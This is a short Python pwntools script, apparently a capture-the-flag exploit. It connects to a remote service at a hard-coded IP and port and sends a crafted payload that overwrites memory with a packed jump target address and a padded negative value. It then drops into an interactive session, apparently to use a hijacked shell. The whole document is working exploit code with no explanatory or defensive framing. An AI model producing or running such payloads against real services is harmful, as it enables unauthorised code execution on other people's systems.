from pwn import *

script = 'b *0x400994\nc'

#r = process('./q2')
r = remote('68.183.158.95', 8990)
target = 0x400831

#gdb.attach(r, script)
r.sendline(p64(target).ljust(0xc, '\x01') + '\xfe\xff\xff\xff')
for _ in range(5):
	r.sendline('a')

r.interactive()